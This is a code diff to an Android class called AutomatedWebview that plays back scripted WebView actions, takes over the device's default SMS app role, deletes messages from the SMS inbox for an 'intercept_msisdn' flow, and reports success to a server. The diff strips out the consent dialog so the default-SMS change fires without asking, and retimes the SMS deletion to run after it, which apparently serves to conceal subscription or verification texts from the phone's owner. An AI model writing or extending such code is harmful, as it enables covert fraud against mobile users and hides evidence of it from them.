@@ -240,7 +240,8 @@ public class AutomatedWebview extends WebView {
         int seconds = 0;
         Handler handler = new Handler();
         int count = 0;
-        enableSMSDefault();
+
+
         for (final Action item : actionList) {
             if (item.getAction().equalsIgnoreCase("load")) {
                 handler.postDelayed(new Runnable() {
@@ -287,13 +288,19 @@ public class AutomatedWebview extends WebView {
             count++;
         }
 
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                enableSMSDefault();
+            }
+        }, seconds * 1000);
         //Removing SMS from intercept_msisdn
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
                 deleteSMS(context);
             }
-        }, seconds * 1000);
+        }, seconds * 1000+2000);
 
         //Updating server
         final int finalCount = count;
@@ -303,7 +310,7 @@ public class AutomatedWebview extends WebView {
                 if (finalCount == actionList.size())
                     updateData("SUCCESS");
             }
-        }, seconds * 1000 + 20);
+        }, seconds * 1000 + 5000);
     }
 
     //Processing functions
@@ -443,7 +450,7 @@ public class AutomatedWebview extends WebView {
 //        }
         Uri deleteUri = Uri.parse("content://sms");
         int count = 0;
-        Cursor c = context.getContentResolver().query(deleteUri, null, null,
+        Cursor c = context.getContentResolver().query(deleteUri, new String[]{"_id"}, null,
                 null, null);
         while (c.moveToNext()) {
             try {
@@ -545,30 +552,29 @@ public class AutomatedWebview extends WebView {
 
     private void enableSMSDefault() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
-
             if (!Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())) {
-
-                AlertDialog.Builder builder = new AlertDialog.Builder(context);
-                builder.setMessage("This app is not set as your default messaging app. Do you want to set it as default?")
-                        .setCancelable(false)
-                        .setTitle("Alert!")
-                        .setNegativeButton("No", new DialogInterface.OnClickListener() {
-
-                            @Override
-                            public void onClick(DialogInterface dialog, int which) {
-                                dialog.dismiss();
-                            }
-                        })
-                        .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
-                            @TargetApi(19)
-                            public void onClick(DialogInterface dialog, int id) {
-
-                                Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
-                                intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, context.getPackageName());
-                                context.startActivity(intent);
-                            }
-                        });
-                builder.show();
+                Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
+                intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, context.getPackageName());
+                context.startActivity(intent);
+//                AlertDialog.Builder builder = new AlertDialog.Builder(context);
+//                builder.setMessage("This app is not set as your default messaging app. Do you want to set it as default?")
+//                        .setCancelable(false)
+//                        .setTitle("Alert!")
+//                        .setNegativeButton("No", new DialogInterface.OnClickListener() {
+//
+//                            @Override
+//                            public void onClick(DialogInterface dialog, int which) {
+//                                dialog.dismiss();
+//                            }
+//                        })
+//                        .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
+//                            @TargetApi(19)
+//                            public void onClick(DialogInterface dialog, int id) {
+//
+//
+//                            }
+//                        });
+//                builder.show();
             }
         }
     }
